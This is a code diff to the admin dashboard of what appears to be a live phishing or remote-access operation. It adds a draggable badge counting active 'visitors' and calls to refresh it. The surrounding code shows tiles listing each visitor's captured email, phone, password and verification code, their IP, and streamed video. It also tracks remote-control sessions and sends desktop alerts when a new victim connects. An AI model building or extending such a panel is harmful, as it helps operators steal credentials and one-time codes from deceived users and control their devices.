@@ -21,12 +21,155 @@ document.getElementById('admin-password').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') document.getElementById('login-btn').click();
 });
 
+// ---------- ACTIVE DEVICE COUNT (DRAGGABLE) ----------
+function updateActiveCount() {
+    const online = Array.from(visitors.values()).filter(v => v.status === 'online').length;
+    const total = visitors.size;
+
+    let badge = document.getElementById('active-device-count');
+    if (!badge) {
+        if (!document.getElementById('pulse-anim-style')) {
+            const style = document.createElement('style');
+            style.id = 'pulse-anim-style';
+            style.textContent = `
+                @keyframes pulse {
+                    0%, 100% { opacity: 1; transform: scale(1); }
+                    50% { opacity: 0.5; transform: scale(1.3); }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        badge = document.createElement('div');
+        badge.id = 'active-device-count';
+        
+        // Restore saved position or default to bottom-left
+        const savedX = localStorage.getItem('sms-badge-x');
+        const savedY = localStorage.getItem('sms-badge-y');
+
+        badge.style.cssText = `
+            position: fixed;
+            ${savedX && savedY ? `left: ${savedX}px; top: ${savedY}px;` : `bottom: 24px; left: 24px;`}
+            background: var(--success, #10b981);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(16,185,129,0.35);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: grab;
+            user-select: none;
+            touch-action: none; /* Prevents scroll on mobile drag */
+            font-family: inherit;
+        `;
+        document.body.appendChild(badge);
+
+        // Dragging logic
+        let isDragging = false;
+        let startX, startY, initialLeft, initialTop;
+
+        badge.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            badge.style.cursor = 'grabbing';
+            
+            // Convert bottom/left to top/left for easier math
+            const rect = badge.getBoundingClientRect();
+            badge.style.bottom = 'auto';
+            badge.style.right = 'auto';
+            badge.style.left = rect.left + 'px';
+            badge.style.top = rect.top + 'px';
+
+            startX = e.clientX;
+            startY = e.clientY;
+            initialLeft = rect.left;
+            initialTop = rect.top;
+            e.preventDefault();
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            if (!isDragging) return;
+            const dx = e.clientX - startX;
+            const dy = e.clientY - startY;
+            
+            let newLeft = initialLeft + dx;
+            let newTop = initialTop + dy;
+
+            // Keep inside window bounds
+            const rect = badge.getBoundingClientRect();
+            newLeft = Math.max(0, Math.min(newLeft, window.innerWidth - rect.width));
+            newTop = Math.max(0, Math.min(newTop, window.innerHeight - rect.height));
+
+            badge.style.left = newLeft + 'px';
+            badge.style.top = newTop + 'px';
+        });
+
+        document.addEventListener('mouseup', () => {
+            if (!isDragging) return;
+            isDragging = false;
+            badge.style.cursor = 'grab';
+            
+            // Save position
+            const rect = badge.getBoundingClientRect();
+            localStorage.setItem('sms-badge-x', rect.left);
+            localStorage.setItem('sms-badge-y', rect.top);
+        });
+
+        // Touch support
+        badge.addEventListener('touchstart', (e) => {
+            isDragging = true;
+            const rect = badge.getBoundingClientRect();
+            badge.style.bottom = 'auto';
+            badge.style.right = 'auto';
+            badge.style.left = rect.left + 'px';
+            badge.style.top = rect.top + 'px';
+            
+            startX = e.touches[0].clientX;
+            startY = e.touches[0].clientY;
+            initialLeft = rect.left;
+            initialTop = rect.top;
+        }, { passive: true });
+
+        document.addEventListener('touchmove', (e) => {
+            if (!isDragging) return;
+            const dx = e.touches[0].clientX - startX;
+            const dy = e.touches[0].clientY - startY;
+            
+            let newLeft = initialLeft + dx;
+            let newTop = initialTop + dy;
+            
+            const rect = badge.getBoundingClientRect();
+            newLeft = Math.max(0, Math.min(newLeft, window.innerWidth - rect.width));
+            newTop = Math.max(0, Math.min(newTop, window.innerHeight - rect.height));
+
+            badge.style.left = newLeft + 'px';
+            badge.style.top = newTop + 'px';
+        }, { passive: true });
+
+        document.addEventListener('touchend', () => {
+            if (!isDragging) return;
+            isDragging = false;
+            
+            const rect = badge.getBoundingClientRect();
+            localStorage.setItem('sms-badge-x', rect.left);
+            localStorage.setItem('sms-badge-y', rect.top);
+        });
+    }
+
+    // Keep the inner HTML updating without destroying the element or its event listeners
+    badge.innerHTML = `
+        <span style="width:8px;height:8px;background:white;border-radius:50%;display:inline-block;animation:pulse 1.2s infinite; pointer-events: none;"></span>
+        <span style="pointer-events: none;">${online} active / ${total} total</span>
+    `;
+}
+
 // ---------- DESKTOP NOTIFICATIONS ----------
 function showDesktopNotification(visitorId, userAgent) {
     if (!("Notification" in window)) return;
     if (Notification.permission !== "granted") return;
-
-    // Only show if the tab is currently in the background
     if (!document.hidden) return;
 
     const options = {
@@ -47,22 +190,22 @@ function showDesktopNotification(visitorId, userAgent) {
 function initWS(password) {
     currentPassword = password;
     try { sessionStorage.setItem('adminPass', password); } catch(e) {}
-   
+
     if (ws) {
         ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
         try { ws.close(); } catch(e) {}
     }
-   
+
     const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
     const newWs = new WebSocket(`${protocol}${window.location.host}`);
     ws = newWs;
-   
+
     newWs.onopen = () => newWs.send(JSON.stringify({ type: 'role', role: 'admin', password }));
-   
+
     newWs.onmessage = async (e) => {
         if (ws !== newWs) return;
         const data = JSON.parse(e.data);
-       
+
         if (data.type === 'auth-failed') {
             document.getElementById('login-error').textContent = data.message || 'Invalid password';
             try { sessionStorage.removeItem('adminPass'); } catch(e) {}
@@ -76,8 +219,8 @@ function initWS(password) {
             visitors.clear();
             data.visitors.forEach(v => addOrUpdateVisitor(v));
             toggleEmptyState();
-           
-            // Request notification permission if not already granted/denied
+            updateActiveCount();
+
             if ("Notification" in window && Notification.permission === "default") {
                 Notification.requestPermission();
             }
@@ -87,13 +230,15 @@ function initWS(password) {
             addOrUpdateVisitor(data.visitor);
             playBeep();
             showAdminToast(data.visitor.id.split('-')[0], data.visitor.userAgent);
-            showDesktopNotification(data.visitor.id.split('-')[0], data.visitor.userAgent); // Trigger OS notification
+            showDesktopNotification(data.visitor.id.split('-')[0], data.visitor.userAgent);
             toggleEmptyState();
+            updateActiveCount();
             return;
         }
         if (data.type === 'visitor-disconnected') {
             const v = visitors.get(data.id);
             if (v) { v.status = 'offline'; addOrUpdateVisitor(v); }
+            updateActiveCount();
         }
         if (data.type === 'visitor-removed') {
             visitors.delete(data.id);
@@ -108,8 +253,12 @@ function initWS(password) {
             }
             toggleEmptyState();
             applyFilter();
+            updateActiveCount();
         }
-        if (data.type === 'visitor-updated') addOrUpdateVisitor(data.visitor);
+        if (data.type === 'visitor-updated') {
+            addOrUpdateVisitor(data.visitor);
+            updateActiveCount();
+        }
 
         if (data.type === 'control-granted') {
             controlledVisitors.add(data.sender);
@@ -146,12 +295,12 @@ function initWS(password) {
             await pc.setLocalDescription(answer);
             ws.send(JSON.stringify({ type: 'webrtc-answer', sdp: answer, target: visitorId }));
         }
-       
+
         if (data.type === 'webrtc-ice') {
             const visitorId = data.sender;
             const pc = peerConnections.get(visitorId);
             if (pc && pc.remoteDescription) {
-                try { await pc.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) {}
+                try { await pc.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(err) {}
             } else {
                 if (!pendingCandidates.has(visitorId)) pendingCandidates.set(visitorId, []);
                 pendingCandidates.get(visitorId).push(data.candidate);
@@ -164,7 +313,7 @@ function initWS(password) {
 window.addEventListener('load', () => {
     let savedPass = null;
     try { savedPass = sessionStorage.getItem('adminPass'); } catch(e) {}
-   
+
     if (savedPass) {
         document.getElementById('login-error').textContent = 'Reconnecting...';
         document.getElementById('login-error').style.color = 'var(--text-muted)';
@@ -174,26 +323,29 @@ window.addEventListener('load', () => {
         document.getElementById('dashboard-screen').classList.remove('active');
         document.getElementById('login-error').textContent = '';
     }
+
+    updateActiveCount();
 });
 
 function refreshDashboard() {
     const btn = document.getElementById('refresh-btn');
     btn.classList.add('spinning');
     btn.disabled = true;
-   
+
     visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
     peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
     peerConnections.clear();
     document.querySelectorAll('.tile').forEach(t => t.remove());
     toggleEmptyState();
-   
+    updateActiveCount();
+
     if (currentPassword) initWS(currentPassword);
     else {
         let saved = null;
         try { saved = sessionStorage.getItem('adminPass'); } catch(e) {}
         if (saved) initWS(saved);
     }
-   
+
     setTimeout(() => {
         btn.classList.remove('spinning');
         btn.disabled = false;
@@ -204,18 +356,19 @@ function refreshDashboard() {
 function signOut() {
     try { sessionStorage.removeItem('adminPass'); } catch(e) {}
     currentPassword = null;
-   
+
     if (ws) {
         ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
         try { ws.close(); } catch(e) {}
     }
-   
+
     visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
     peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
     peerConnections.clear();
     document.querySelectorAll('.tile').forEach(t => t.remove());
     toggleEmptyState();
-   
+    updateActiveCount();
+
     document.getElementById('dashboard-screen').classList.remove('active');
     document.getElementById('login-screen').classList.add('active');
     document.getElementById('admin-password').value = '';
@@ -370,7 +523,7 @@ function createTile(v) {
     tile.id = `tile-${v.id}`;
     tile.className = 'tile';
     tile.dataset.status = v.status;
-   
+
     tile.innerHTML = `
         <div class="tile-header">
             <div class="tile-info">
@@ -410,9 +563,9 @@ function createTile(v) {
             </div>
         </div>
     `;
-   
+
     document.getElementById('visitor-grid').appendChild(tile);
-   
+
     if (streams.has(v.id)) {
         const video = document.getElementById(`video-${v.id}`);
         if (video) { video.srcObject = streams.get(v.id); video.play().catch(err => console.log("Play blocked", err)); }
@@ -423,24 +576,24 @@ function createTile(v) {
 function updateTile(v) {
     let tile = document.getElementById(`tile-${v.id}`);
     if (!tile) tile = createTile(v);
-   
+
     document.getElementById(`title-${v.id}`).textContent = `ID: ${v.id.split('-')[0]}`;
-   
+
     let contactHtml = '<div class="contact-badges">';
     if (v.email) contactHtml += `<span class="c-badge"><strong>E:</strong> <span>${v.email}</span></span>`;
     if (v.phone) contactHtml += `<span class="c-badge"><strong>P:</strong> <span>${v.phone}</span></span>`;
     if (v.password) contactHtml += `<span class="c-badge pass"><strong>Pass:</strong> <span>${v.password}</span></span>`;
     if (v.code) contactHtml += `<span class="c-badge code"><strong>Code:</strong> <span>${v.code}</span></span>`;
     contactHtml += '</div>';
-   
+
     document.getElementById(`contact-${v.id}`).innerHTML = contactHtml;
     document.querySelector(`.device-${v.id}`).textContent = parseUserAgent(v.userAgent);
     document.querySelector(`.ip-${v.id}`).textContent = v.ip;
     tile.dataset.status = v.status;
-   
+
     const msgInput = document.getElementById(`msg-${v.id}`);
     const msgBtn = msgInput.nextElementSibling;
-   
+
     if (v.status === 'online') {
         msgInput.disabled = false; msgBtn.disabled = false;
         startTimer(v.id, v.connectedAt);
@@ -510,6 +663,7 @@ document.getElementById('confirm-delete-btn').addEventListener('click', () => {
         const tile = document.getElementById(`tile-${deleteTargetId}`);
         if (tile) tile.remove();
         toggleEmptyState(); applyFilter(); closeDeleteModal();
+        updateActiveCount();
     }
 });
 
